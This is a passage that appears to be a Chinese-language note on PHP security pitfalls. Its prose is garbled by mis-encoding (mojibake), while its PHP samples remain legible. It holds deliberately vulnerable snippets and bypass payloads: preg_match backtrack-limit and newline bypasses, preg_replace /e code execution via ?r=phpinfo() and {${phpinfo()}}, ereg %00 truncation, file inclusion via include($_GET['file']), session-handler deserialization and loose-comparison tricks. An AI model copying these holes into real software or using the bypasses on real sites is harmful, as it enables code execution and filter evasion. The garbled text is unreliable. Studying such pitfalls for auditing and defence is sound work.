â€œ\\x0Bâ€(ASCII 11 (0x0B))ï¼Œå‚ç›´åˆ¶è¡¨ç¬¦ã€‚ Â· \\fçš„æ„æ€æ˜¯ï¼šæ¢é¡µã€‚å°†å½“å‰ä½ç½®ç§»åˆ°ä¸‹ä¸€é¡µçš„å¼€å¤´ã€‚ &lt;?php $a = \" \\r\\t\\v\\0abc \\f\"; var_dump(trim($a)); ?&gt; preg_match preg_match å‡½æ•°ç”¨äºè¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼Œè¿”å› pattern çš„åŒ¹é…æ¬¡æ•°ï¼Œå®ƒçš„å€¼å°†æ˜¯ 0 æ¬¡ï¼ˆä¸åŒ¹é…ï¼‰æˆ– 1 æ¬¡ï¼Œå› ä¸º preg_match() åœ¨ç¬¬ä¸€æ¬¡åŒ¹é…åå°†ä¼šåœæ­¢æœç´¢ã€‚å¦‚æœåœ¨è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„æ—¶å€™ï¼Œæ²¡æœ‰é™åˆ¶å­—ç¬¦ä¸²çš„å¼€å§‹å’Œç»“æŸ(^ å’Œ $)ï¼Œåˆ™å¯ä»¥å­˜åœ¨ç»•è¿‡çš„é—®é¢˜ é¦–å…ˆpreg_matchåªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œä¼ å…¥æ•°ç»„çš„æ—¶å€™å°±ä¼šè¿”å›falseï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ•°æ®ç»•è¿‡ï¼Œä¾‹å­å¦‚ä¸‹ &lt;?php $pattern = '/world/'; $string = array('hello', 'world'); $result = preg_match($pattern, $string); var_dump($result); pre_match åœ¨åŒ¹é…çš„æ—¶å€™ä¼šæ¶ˆè€—è¾ƒå¤§çš„èµ„æºï¼Œå¹¶ä¸”é»˜è®¤å­˜åœ¨è´ªå©ªåŒ¹é…ï¼Œå¦‚æœä¼ å…¥ä¸€ä¸ªè¶…é•¿çš„å­—ç¬¦ä¸²ï¼Œä¼šå¯¼è‡´ pre_match æ¶ˆè€—å¤§é‡èµ„æºä»è€Œå¯¼è‡´ php è¶…æ—¶ï¼ˆä¸€èˆ¬ä¸º30sï¼‰ï¼Œåé¢çš„ php è¯­å¥å°±ä¸ä¼šæ‰§è¡Œã€‚ &lt;?php $code = \"hybcx###AAAAAAAAAAAAAAAAAAAAAAAA(nä¸ªA)\"; preg_match(\"/(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)/\", $code); ?&gt; å›æº¯ç»•è¿‡ï¼špcre.backtrack_limit ç»™ pcre è®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ï¼Œé»˜è®¤ä¸º1000000ï¼Œå¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡è¿™ä¸ªæ•°å­—ï¼Œpreg_match å°±ä¼šè¿”å› falseï¼Œå³åŒ¹é…å¤±è´¥ï¼Œä»è€Œç»•è¿‡æ­£åˆ™åŒ¹é…ã€‚ https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html &lt;?php function is_php($data){ return preg_match('/&lt;\\?.*[(`;?&gt;].*/is', $data); } if(!is_php($input)) { // fwrite($f, $input); ... } å¯å¡«å…¥åƒåœ¾æ•°æ®å¯¼è‡´å›æº¯æ¬¡æ•°è¶…è¿‡äº†100ä¸‡ preg_match è¿”å› FALSE ç»•è¿‡åˆ¤æ–­ //bool(false) var_dump(preg_match('/&lt;\\?.*[(`;?&gt;].*/is', '&lt;?php phpinfo();//'.str_repeat('c', 1000000))); ä¿®å¤æ–¹æ³•ï¼Œæ”¹ç”¨ === åˆ¤æ–­è¿”å›å€¼ï¼Œä¸è¦åªä½¿ç”¨ if åˆ¤æ–­ &lt;?php function is_php($data){ return preg_match('/&lt;\\?.*[(`;?&gt;].*/is', $data); } if(is_php($input) === 0) { // fwrite($f, $input); ... } %0a æ¢è¡Œç»•è¿‡ï¼šä¸ä¼šåŒ¹é…æ¢è¡Œç¬¦ï¼Œå¹¶ä¸”åœ¨éå¤šè¡Œæ¨¡å¼ä¸‹ï¼Œå½“å‡ºç°æ¢è¡Œç¬¦ %0a çš„æ—¶å€™ï¼Œä¼šè¢«å½“åšä¸¤è¡Œå¤„ç†ï¼Œè€Œæ­¤æ—¶åªå¯ä»¥åŒ¹é…ç¬¬ä¸€è¡Œï¼Œåé¢çš„è¡Œå°±ä¼šè¢«å¿½ç•¥ã€‚ï¼ˆåŸå› å…¶å®æ˜¯æ­£åˆ™ä¹¦å†™ä¸å½“ï¼‰ &lt;?php $file_name = $_GET['path']; if(!preg_match(\"/^[a-zA-Z0-9-s_]+.rpt$/m\", $file_name)){ echo \"regex failed\"; }else{ echo \"flag{success}\"; } ?&gt; æ³¨æ„åˆ°æ­£åˆ™è¡¨è¾¾å¼ç»“å°¾çš„/m äº†ï¼Œåœ¨phpä¸­ï¼Œ/mè¡¨ç¤ºå¼€å¯å¤šè¡ŒåŒ¹é…æ¨¡å¼ï¼Œå¼€å¯å¤šè¡ŒåŒ¹é…æ¨¡å¼ä¹‹å^å’Œ$çš„å«ä¹‰å°±å‘ç”Ÿäº†å˜åŒ–ï¼Œæ²¡å¼€å¯å¤šè¡Œæ¨¡å¼ä¹‹å‰(å³å•è¡ŒåŒ¹é…æ¨¡å¼), ^ å’Œ$ æ˜¯åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹å’Œç»“å°¾ï¼Œå¼€å¯å¤šè¡Œæ¨¡å¼ä¹‹åï¼Œå¤šè¡Œæ¨¡å¼^,$å¯ä»¥åŒ¹é…æ¯è¡Œçš„å¼€å¤´å’Œç»“å°¾ï¼Œæ‰€ä»¥ä¸Šè¿°payloadé‡Œé¢å«æœ‰æ¢è¡Œç¬¦ï¼Œè¢«å½“åšä¸¤è¡Œå¤„ç†ï¼Œä¸€è¡ŒåŒ¹é…OKå³å¯ï¼Œelseåˆ†æ”¯ preg_replace å®šä¹‰ï¼špreg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed æœç´¢ subject ä¸­åŒ¹é… pattern çš„éƒ¨åˆ†ï¼Œ ä»¥ replacement è¿›è¡Œæ›¿æ¢ $pattern: è¦æœç´¢çš„æ¨¡å¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ã€‚ $replacement: ç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚ $subject: è¦æœç´¢æ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚ $limit: å¯é€‰ï¼Œå¯¹äºæ¯ä¸ªæ¨¡å¼ç”¨äºæ¯ä¸ª subject å­—ç¬¦ä¸²çš„æœ€å¤§å¯æ›¿æ¢æ¬¡æ•°ã€‚ é»˜è®¤æ˜¯-1ï¼ˆæ— é™åˆ¶ï¼‰ã€‚ $count: å¯é€‰ï¼Œä¸ºæ›¿æ¢æ‰§è¡Œçš„æ¬¡æ•°ã€‚ å¸¸ç”¨PCREä¿®é¥°ç¬¦ï¼š i (PCRE_CASELESS)ï¼šå¦‚æœè®¾ç½®äº†è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œæ¨¡å¼ä¸­çš„å­—æ¯ä¼šè¿›è¡Œå¤§å°å†™ä¸æ•æ„ŸåŒ¹é… m (PCRE_MULTILINE)ï¼š â€œè¡Œé¦–â€å…ƒå­—ç¬¦ (^) å’Œâ€è¡Œæœ«â€å…ƒå­—ç¬¦ ($) ä¼šåŒ¹é…ç›®æ ‡å­—ç¬¦ä¸²ä¸­ä»»æ„æ¢è¡Œç¬¦ä¹‹å‰æˆ–ä¹‹å s (PCRE_DOTALL)ï¼šç‚¹å·å…ƒå­—ç¬¦åŒ¹é…æ‰€æœ‰å­—ç¬¦ï¼ŒåŒ…å«æ¢è¡Œç¬¦ã€‚å¦‚æœæ²¡æœ‰è¿™ä¸ª ä¿®é¥°ç¬¦ï¼Œç‚¹å·ä¸åŒ¹é…æ¢è¡Œç¬¦ã€‚ä¸€ä¸ªå–åå­—ç¬¦ç±»æ¯”å¦‚ [^a] æ€»æ˜¯åŒ¹é…æ¢è¡Œç¬¦ï¼Œè€Œä¸ä¾èµ–äºè¿™ä¸ªä¿®é¥°ç¬¦çš„è®¾ç½®ã€‚ https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php 1ï¼‰/e ä¿®é¥°ç¬¦é—®é¢˜ åœ¨PHP5.5.0èµ·åºŸå¼ƒï¼Œphp7.0.0 èµ·ä¸å†æ”¯æŒ &lt;?php echo preg_replace('/test/e',$_GET['r'],'atest'); ?r=phpinfo()ï¼Œè·å– phpinfo https://xz.aliyun.com/t/2557 &lt;?php function complexStrtolower($regex, $value) { return preg_replace( '/(' . $regex . ')/ei', 'strtolower(\"\\\\1\")', $value ); } foreach ($_GET as $regex =&gt; $value) { echo complexStrtolower($regex, $value) . \" \"; } ?\\S*={${phpinfo()}} ï¼Œæ­£åˆ™è¡¨è¾¾å¼ \\1 è¡¨ç¤ºç¬¦åˆåŒ¹é…çš„ç¬¬ä¸€ä¸ªå­ä¸²ï¼Œ{${phpinfo()}} ä½¿ç”¨äº†å¯å˜å˜é‡çš„çŸ¥è¯†ã€‚ 2ï¼‰ç»å…¸å†™é…ç½®æ¼æ´ https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html //index.php &lt;?php $api = addslashes($_GET['api']); echo $api; $file = file_get_contents('./option.php'); $file = preg_replace(\"/define\\('API', '.*'\\);/s\", \"define('API', '{$api}');\", $file); file_put_contents('./option.php', $file); //option.php &lt;?php define('API', 'aaa\\\\'); ereg åŠŸèƒ½åŒ preg_match() ç±»ä¼¼ï¼Œåªä¸è¿‡ä»…åœ¨ php4ï¼Œphp5 ä¸­å¯ä½¿ç”¨ï¼Œå¯ä½¿ç”¨ %00 æˆªæ–­æ­£åˆ™åŒ¹é… tipsï¼šereg()åªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œé‡åˆ°æ•°ç»„åšå‚æ•°è¿”å›NULL //?password=123%00&amp;&amp;** //int 1 var_dump(ereg (\"^[a-zA-Z0-9]+$\", $_GET['password'])); htmlentities ä¸€èˆ¬ä»…ä»… htmlenetities($query) è¿™æ ·ç”¨ï¼Œä¸åŠ ç¬¬äºŒä¸ªå‚æ•°çš„æƒ…å†µä¸‹ï¼Œå¾ˆæœ‰å¯èƒ½å­˜åœ¨æ¼æ´ htmlentitiesä¸åŠ ç¬¬äºŒä¸ªå‚æ•°çš„è¯ï¼Œä¸ä¼šè½¬ä¹‰å•å¼•å·ã€‚ æ³¨ï¼šè¯¥å‡½æ•°å¹¶ä¸èƒ½è½¬æ¢æ‰€æœ‰çš„ç‰¹æ®Šå­—ç¬¦ï¼Œæ˜¯è½¬æ¢é™¤äº†ç©ºæ ¼ä¹‹å¤–çš„ç‰¹æ®Šå­—ç¬¦ï¼Œå¹¶ä¸”å•å¼•å·å’ŒåŒå¼•å·éœ€è¦å•ç‹¬æ§åˆ¶ï¼ˆé€šè¿‡ç¬¬äºŒä¸ªå‚æ•°ï¼‰ã€‚ç¬¬äºŒä¸ªå‚æ•°ä¸»è¦å–å€¼æœ‰ä»¥ä¸‹ä¸‰ä¸ªï¼š ENT_COMPATï¼ˆé»˜è®¤å€¼ï¼‰ ä¼šè½¬æ¢åŒå¼•å·ï¼Œä¸è½¬æ¢å•å¼•å·ã€‚ ENT_QUOTES æ—¢è½¬æ¢åŒå¼•å·ä¹Ÿè½¬æ¢å•å¼•å·ã€‚ ENT_NOQUOTES å•/åŒå¼•å·éƒ½ä¸è½¬æ¢ æ¡ˆä¾‹å‚è€ƒï¼šPHP-Audit-Labs/README.md at master Â· hongriSec/PHP-Audit-Labs (github.com) ï¼ˆç”±äºhtmlentitiesè¿ç”¨é”™è¯¯ï¼Œå¯¼è‡´XSSã€SQLæ³¨å…¥ï¼‰ $_REQUEST æ¼æ´ä¸€ array_map â€” ä¸ºæ•°ç»„çš„æ¯ä¸ªå…ƒç´ åº”ç”¨å›è°ƒå‡½æ•° array_map(callable $callback,array $array1[, array $... ]):array array_map()ï¼šè¿”å›æ•°ç»„ï¼Œæ˜¯ä¸º array1 æ¯ä¸ªå…ƒç´ åº”ç”¨ callbackå‡½æ•°ä¹‹åçš„æ•°ç»„ã€‚callbackå‡½æ•°å½¢å‚çš„æ•°é‡å’Œä¼ ç»™ array_map() æ•°ç»„æ•°é‡ï¼Œä¸¤è€…å¿…é¡»ä¸€æ ·ã€‚ &lt;?php $_GET = array_map('intval', $_GET); $_POST = array_map('intval', $_POST); $_COOKIE = array_map('intval', $_COOKIE); echo \"======== GET =========\".\"&lt;br/&gt;\"; var_dump($_GET); echo \"======== POST =========\".\"&lt;br/&gt;\"; var_dump($_POST); echo \"======== COOKIE =========\".\"&lt;br/&gt;\"; var_dump($_COOKIE); echo \"======== REQUEST =========\".\"&lt;br/&gt;\"; var_dump($_REQUEST); ?&gt; å¯ä»¥å‘ç° REQUEST æ•°æ®ä¸æ¯«ä¸å—è¿‡æ»¤å‡½æ•°çš„å½±å“ï¼ˆæ„æ€å°±æ˜¯GPCçš„æ•°æ®ç»è¿‡è¿‡æ»¤å¤„ç†ï¼Œrequestä¸ä¼šå—åˆ°å½±å“ï¼‰ æ¡ˆä¾‹ï¼šPHP-Audit-Labs/README.md at master Â· hongriSec/PHP-Audit-Labs (github.com) æ¼æ´äºŒ phpä¸­ REQUEST å˜é‡é»˜è®¤æƒ…å†µä¸‹åŒ…å«äº† GET ï¼ŒPOST å’Œ COOKIE çš„æ•°ç»„ã€‚åœ¨ php.ini é…ç½®æ–‡ä»¶ä¸­ï¼Œæœ‰ä¸€ä¸ªå‚æ•° variables_order ï¼Œè¿™å‚æ•°æœ‰ä»¥ä¸‹å¯é€‰é¡¹ç›® è¿™äº›å­—æ¯åˆ†åˆ«å¯¹åº”çš„æ˜¯ E: Environment ï¼ŒG:Getï¼ŒP:Postï¼ŒC:Cookieï¼ŒS:Serverã€‚è¿™äº›å­—æ¯çš„å‡ºç°é¡ºåºï¼Œè¡¨æ˜äº†æ•°æ®çš„åŠ è½½é¡ºåºã€‚è€Œ php.ini ä¸­è¿™ä¸ªå‚æ•°é»˜è®¤çš„é…ç½®æ˜¯ GPCS ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœä»¥ POST ã€ GET æ–¹å¼ä¼ å…¥ç›¸åŒçš„å˜é‡ï¼Œé‚£ä¹ˆç”¨ REQUEST è·å–è¯¥å˜é‡çš„å€¼å°†ä¸º POST è¯¥å˜é‡çš„å€¼ æ‰€æœ‰å¦‚æœå­˜åœ¨ç±»ä¼¼ï¼š$_GETä¼ å…¥çš„å‚æ•°ï¼Œé€šè¿‡$_REQUESTè¿›è¡Œè¿‡æ»¤ï¼Œå°±å¯èƒ½å­˜åœ¨é—®é¢˜ &lt;?php $get = \"GET: \".$_GET['var']; $post = \"POST: \".$_POST['var']; $request = \"REQUEST: \".$_REQUEST['var']; echo $get.\"&lt;br/&gt;\"; echo $post.\"&lt;br/&gt;\"; echo $request; ?&gt; æ¡ˆä¾‹ï¼šPHP-Audit-Labs/README.md at master Â· hongriSec/PHP-Audit-Labs (github.com) iconv in_charsetï¼šè¾“å…¥çš„å­—ç¬¦é›†ã€‚ out_charsetï¼šè¾“å‡ºçš„å­—ç¬¦é›†ã€‚ strï¼šè¦è½¬æ¢çš„å­—ç¬¦ä¸²ã€‚ iconvåœ¨å­—ç¬¦ä¸²ç¼–ç çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šå¯¼è‡´å­—ç¬¦ä¸²æˆªæ–­ã€‚å½“$strä¸­æœ‰ä¸€ä¸ªå­—ç¬¦ä¸èƒ½è¢«ç›®æ ‡å­—ç¬¦é›†æ‰€è¡¨ç¤ºï¼Œ$strå°±ä»ç¬¬ä¸€ä¸ªæ— æ•ˆå­—ç¬¦å¼€å§‹æˆªæ–­å¹¶å¯¼è‡´ä¸€ä¸ªE_NOTICE &lt;?php $a = '1'. chr(130).'2'; echo $a.\"&lt;br/&gt;\"; echo iconv(\"UTF-8\", \"gbk\", $a); ?&gt; ä¸è¿‡è¿™é‡Œæˆ‘è®¤ä¸ºæœ‰ç‰ˆæœ¬é™åˆ¶ï¼Œå› ä¸ºï¼š5.4.0 è¿™ä¸ªç‰ˆæœ¬èµ·ï¼Œå­—ç¬¦éæ³•æ—¶å€™ä¼šè¿”å› FALSEï¼Œé™¤éåœ¨è¾“å‡ºå­—ç¬¦é‡ŒæŒ‡å®šäº† //IGNORE ã€‚ åœ¨ä¹‹å‰ç‰ˆæœ¬ï¼Œå®ƒä¼šè¿”å›ä¸€éƒ¨åˆ†å­—ç¬¦ä¸²ã€‚ ä¹Ÿå°±æ˜¯è¯´è¯¥ç‰ˆæœ¬ä»¥ä¸Šï¼ŒåŸºäºä¸Šè¿°ä¾‹å­ï¼Œä¼šç›´æ¥è¿”å›falseï¼Œè€Œä¸æ˜¯å­—ç¬¦ä¸² Windows FindFirstFile å°†æ–‡ä»¶ä¸å¯çŸ¥éƒ¨åˆ†ä¹‹åçš„å­—ç¬¦ç”¨ â€˜&lt;â€™ æˆ–è€…â€™&gt;â€™ä»£æ›¿ï¼Œåªä½¿ç”¨ä¸€ä¸ªâ€™&gt;â€˜åªèƒ½ä»£è¡¨ä¸€ä¸ªå­—ç¬¦ï¼Œä½¿ç”¨â€™&gt;&gt;â€™ä¸¤ä¸ªå¯ä»¥ä»£æ›¿å¤šä¸ªå­—ç¬¦ã€‚å¯ä»¥ç”¨æ¥è¿›è¡ŒæœªçŸ¥æ–‡ä»¶åçš„æ–‡ä»¶åŒ…å«ï¼Œå’Œç›®å½•çˆ†ç ´ã€‚ &lt;?php include ($_GET['file']); ?&gt; sessionååºåˆ—åŒ– åœ¨phpä¸­sessionæœ‰ä¸‰ç§åºåˆ—åŒ–çš„æ–¹å¼ï¼Œåˆ†åˆ«æ˜¯php_serialize, php_binaryå’Œphp ã€åœ¨ PHP ä¸­é»˜è®¤ä½¿ç”¨çš„æ˜¯ PHP å¼•æ“ï¼Œå¦‚æœè¦ä¿®æ”¹ä¸ºå…¶ä»–çš„å¼•æ“ï¼Œåªéœ€è¦æ·»åŠ ä»£ç ini_set('session.serialize_handler', '``éœ€è¦è®¾ç½®çš„å¼•æ“``')``ã€‘ è¿™é‡Œä¸¾ä¸ªä¾‹å­æ¥äº†è§£ä¸€ä¸‹åœ¨ä¸åŒçš„å¤„ç†å™¨ä¸‹ï¼Œsessionæ‰€å‚¨å­˜çš„æ ¼å¼æœ‰ä»€ä¹ˆä¸ä¸€æ ·(æµ‹è¯•çš„æ—¶å€™phpç‰ˆæœ¬ä¸€å®šè¦å¤§äº5.5.4ï¼Œä¸ç„¶sessionå†™ä¸è¿›æ–‡ä»¶))ï¼š &lt;?php ini_set('session.serialize_handler', 'php'); //ini_set('session.serialize_handler', \"php_serialize\"); //ini_set('session.serialize_handler', \"php_binary\"); session_start(); $_SESSION['hybcx'] = $_GET['a']; echo \"&lt;pre&gt;\"; var_dump($_SESSION); echo \"&lt;/pre&gt;\"; ?&gt; è¿™é‡Œæˆ‘è¾“å‡ºä¸äº†ï¼Œç›´æ¥cväº† è¿™æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œå…¶å®PHPä¸­çš„Sessionçš„å®ç°æ˜¯æ²¡æœ‰çš„é—®é¢˜ï¼Œå±å®³ä¸»è¦æ˜¯ç”±äºç¨‹åºå‘˜çš„Sessionä½¿ç”¨ä¸å½“è€Œå¼•èµ·çš„ã€‚å¦‚ï¼šä½¿ç”¨ä¸åŒå¤„ç†å™¨æ¥å¤„ç†sessionæ–‡ä»¶ã€‚ phpå¼•æ“çš„å­˜å‚¨æ ¼å¼æ˜¯é”®å | serialized_stringï¼Œè€Œphp_serializeå¼•æ“çš„å­˜å‚¨æ ¼å¼æ˜¯serialized_stringã€‚å¦‚æœç¨‹åºä½¿ç”¨ä¸¤ä¸ªå¼•æ“æ¥åˆ†åˆ«å¤„ç†çš„è¯å°±ä¼šå‡ºç°é—®é¢˜ã€‚ å…ˆä»¥php_serializeçš„æ ¼å¼å­˜å‚¨ï¼Œä»å®¢æˆ·ç«¯æ¥æ”¶å‚æ•°å¹¶å­˜å…¥sessionå˜é‡ æ¥ä¸‹æ¥ä½¿ç”¨phpå¤„ç†å™¨è¯»å–sessionæ–‡ä»¶ é¦–å…ˆè®¿é—®1.phpï¼Œåœ¨ä¼ å…¥çš„å‚æ•°æœ€å¼€å§‹åŠ ä¸€ä¸ªâ€™|â€˜ï¼Œç”±äº1.phpæ˜¯ä½¿ç”¨php_serializeå¤„ç†å™¨å¤„ç†ï¼Œå› æ­¤åªä¼šæŠŠâ€™|â€˜å½“åšä¸€ä¸ªæ­£å¸¸çš„å­—ç¬¦ã€‚ç„¶åè®¿é—®2.phpï¼Œç”±äºç”¨çš„æ˜¯phpå¤„ç†å™¨ï¼Œå› æ­¤é‡åˆ°â€™|â€˜æ—¶ä¼šå°†ä¹‹çœ‹åšé”®åä¸å€¼çš„åˆ†å‰²ç¬¦ï¼Œä»è€Œé€ æˆäº†æ­§ä¹‰ï¼Œå¯¼è‡´å…¶åœ¨è§£æsessionæ–‡ä»¶æ—¶ç›´æ¥å¯¹â€™|'åçš„å€¼è¿›è¡Œååºåˆ—åŒ–å¤„ç†ã€‚ è¿™é‡Œå¯èƒ½ä¼šæœ‰ä¸€ä¸ªå°ç–‘é—®ï¼Œä¸ºä»€ä¹ˆåœ¨è§£æsessionæ–‡ä»¶æ—¶ç›´æ¥å¯¹â€™|'åçš„å€¼è¿›è¡Œååºåˆ—åŒ–å¤„ç†ï¼Œè¿™ä¹Ÿæ˜¯å¤„ç†å™¨çš„åŠŸèƒ½ï¼Ÿè¿™ä¸ªå…¶å®æ˜¯å› ä¸ºsession_start()è¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥çœ‹ä¸‹å®˜æ–¹è¯´æ˜ï¼š é¦–å…ˆç”Ÿæˆä¸€ä¸ªpayloadï¼š æ”»å‡»æ€è·¯ä¸­è¯´åˆ°äº†å› ä¸ºä¸åŒçš„å¼•æ“ä¼šå¯¹â€™|â€˜ï¼Œäº§ç”Ÿæ­§ä¹‰ï¼Œæ‰€ä»¥åœ¨ä¼ å‚æ—¶åœ¨payloadå‰åŠ ä¸ªâ€™|'ï¼Œä½œä¸ºaå‚æ•°ï¼Œè®¿é—®1.php,æŸ¥çœ‹ä¸€ä¸‹æœ¬åœ°sessionæ–‡ä»¶ï¼Œå‘ç°payloadå·²ç»å­˜å…¥åˆ°sessionæ–‡ä»¶ å¼±æ¯”è¾ƒ === åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆåˆ¤æ–­ä¸¤ç§å­—ç¬¦ä¸²çš„ç±»å‹æ˜¯å¦ç›¸ç­‰ï¼Œå†æ¯”è¾ƒ == åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆå°†å­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆç›¸åŒï¼Œå†æ¯”è¾ƒ ï¼ˆ1ï¼‰å­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å€¼å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å€¼ï¼Œå¦åˆ™å…¶å€¼åˆ™ä¸º0 var_dump(\"admin\"==0); //true var_dump(\"1admin\"== 1); //true var_dump(\"admin1\"==0) //true ï¼ˆ2ï¼‰åœ¨è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒæ—¶ï¼Œä¼šå°†0eè¿™ç±»å­—ç¬¦ä¸²è¯†åˆ«ä¸ºç§‘å­¦æŠ€æœ¯æ³•çš„æ•°å­—ï¼Œ0çš„æ— è®ºå¤šå°‘æ¬¡æ–¹éƒ½æ˜¯é›¶ï¼Œæ‰€ä»¥ç›¸ç­‰ var_dump(\"0e123456\"==\"0e99999\"); //true ï¼ˆ3ï¼‰å½“å­—ç¬¦ä¸²å½“ä½œæ•°å€¼æ¥å–å€¼æ—¶ï¼Œå¦‚æœå­—ç¬¦ä¸²ä¸­åŒ…å«.ã€eã€Eæˆ–è€…æ•°å€¼è¶…è¿‡æ•´å‹èŒƒå›´å†…æ—¶ï¼Œè¢«å½“ä½œfloatæ¥å–å€¼ï¼Œå¦‚æœæ²¡æœ‰åŒ…å«ä¸Šè¿°å­—ç¬¦ä¸”åœ¨æ•´å½¢èŒƒå›´å†…ï¼Œåˆ™è¯¥å­—ç¬¦ä¸²ä¼šå½“ä½œ int æ¥å–å€¼ $test=1 + \"10.5\"; // $test=11.5(float) $test=1+\"-1.3e3\"; //$test=-1299(float) $test=1+\"bob-1.3e3\";//$test=1(int) $test=1+\"2admin\";//$test=3(int) $test=1+\"admin2\";//$test=1(int) ï¼ˆ4ï¼‰ture å’Œä»»æ„å­—ç¬¦ä¸²å¼±ç±»å‹ç›¸ç­‰ï¼Œå’Œé 0 æ•°å­—å¼±ç±»å‹ç›¸ç­‰ var_dump(\"admin\"== true); //true var_dump(\"0admin\"== true);//true var_dump(7==true);//true var_dump(1==true);//true var_dump(0==true);//false var_dump(-7==true);//true é™„ä¸Šç±»å‹æ¯”è¾ƒè¡¨ï¼šhttps://www.php.net/manual/zh/types.comparisons.php &lt;?php var_dump(\"123.a1bc\"==123);//true var_dump(\"123ea1bc\"==123);//true var_dump(\"123Ea1bc\"==123);//true //ä¸Šé¢éƒ½æ˜¯trueï¼Œæœ‰ä»€ä¹ˆåŒºåˆ«å—ï¼Œå…¶å®è¿™ä¸Šé¢æ˜¯æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œå’Œå‰é¢è¯´åˆ°çš„ä¸€æ ·ï¼Œå°†å­—ç¬¦ä¸²å¼€å§‹éƒ¨åˆ†ä»æ•°å­—è¿ç»­å–åˆ°éæ•°å­—æˆªæ­¢ //é‚£çœ‹çœ‹ä¸‹é¢è¿™å‡ ä¸ªä»£ç  var_dump(\"123.2abc\"==123);//false var_dump(\"123.2abc\"==1232);//false var_dump(\"123e2abc\"==123);//false vardump(\"123E2abc\"==123);//false //å¼€å§‹éƒ¨åˆ†å­˜åœ¨æ•°å­—ï¼Œè‹¥è¿ç»­çš„æ•°å­—ä¸­åŒ…å«.æˆ–eæˆ–Eä¼šå¹²æ‰°å­—ç¬¦ä¸²å’Œæ•°å­—çš„æ¯”è¾ƒï¼Œå› ä¸º.å°±è¡¨ç¤ºäº†æµ®ç‚¹æ•°ï¼Œeå’ŒEè¡¨ç¤ºäº†ç§‘å­¦è®¡æ•°æ³•ï¼Œåªè¦å­—ç¬¦ä¸²ä¸­åŒ…å«è¿™äº›ï¼Œä¸Šé¢æ‰€è¯´çš„æ¯”è¾ƒå°±ä¸èƒ½ç†æƒ³åœ°å®ç° var_dump('root' == 0); //true//åˆ†æï¼šå…ˆå°†å­—ç¬¦ä¸²rootè½¬åŒ–æˆå’Œ0åŒç­‰ç±»å‹å³æ•°å­—å‹ï¼Œå› ä¸ºå­—ç¬¦ä¸²å¼€å§‹æ²¡æœ‰åˆæ³•æ•°å€¼ï¼Œåˆ™å­—ç¬¦ä¸²rootè½¬æ¢ä¸º0ï¼Œæœ€å0==0,æ‰€ä»¥æˆç«‹ã€‚ var_dump(0 == 'root'); //true//åˆ†æï¼šå…ˆå°†å­—ç¬¦ä¸²rootè½¬åŒ–æˆå’Œ0åŒç­‰ç±»å‹å³æ•°å­—å‹ï¼Œå› ä¸ºå­—ç¬¦ä¸²å¼€å§‹æ²¡æœ‰åˆæ³•æ•°å€¼ï¼Œåˆ™å­—ç¬¦ä¸²rootè½¬æ¢ä¸º0ï¼Œæœ€å0==0,æ‰€ä»¥æˆç«‹ã€‚ var_dump('22root' == 22); //true//åˆ†æï¼šå…ˆå°†å­—ç¬¦ä¸²22rootè½¬åŒ–æˆå’Œ0åŒç­‰ç±»å‹å³æ•°å­—å‹ï¼Œå› ä¸ºå­—ç¬¦ä¸²å¼€å§‹æœ‰åˆæ³•æ•°å€¼ï¼Œåˆ™å–å…¶è¿ç»­çš„åˆæ³•æ•°å€¼22ï¼Œæœ€å22==22ï¼Œæ‰€ä»¥æˆç«‹ã€‚ var_dump('22r22oot' == 22); //true//åˆ†æï¼šå…ˆå°†å­—ç¬¦ä¸²22r22ootè½¬åŒ–æˆå’Œ0åŒç­‰ç±»å‹å³æ•°å­—å‹ï¼Œå› ä¸ºå­—ç¬¦ä¸²å¼€å§‹æœ‰åˆæ³•æ•°å€¼ï¼Œåˆ™å–å…¶è¿ç»­çš„åˆæ³•æ•°å€¼22ï¼Œråé¢çš„22å› ä¸ºä¸å¼€å§‹çš„åˆæ³•æ•°å€¼ä¸è¿ç»­ï¼Œæ‰€ä»¥ä¸å–å®ƒçš„å€¼ï¼Œ22==22ï¼Œæ‰€ä»¥æˆç«‹ã€‚ var_dump('root22' == 22); //false//åˆ†æï¼šå…ˆå°†å­—ç¬¦ä¸²root22è½¬åŒ–æˆå’Œ0åŒç­‰ç±»å‹å³æ•°å­—å‹ï¼Œå› 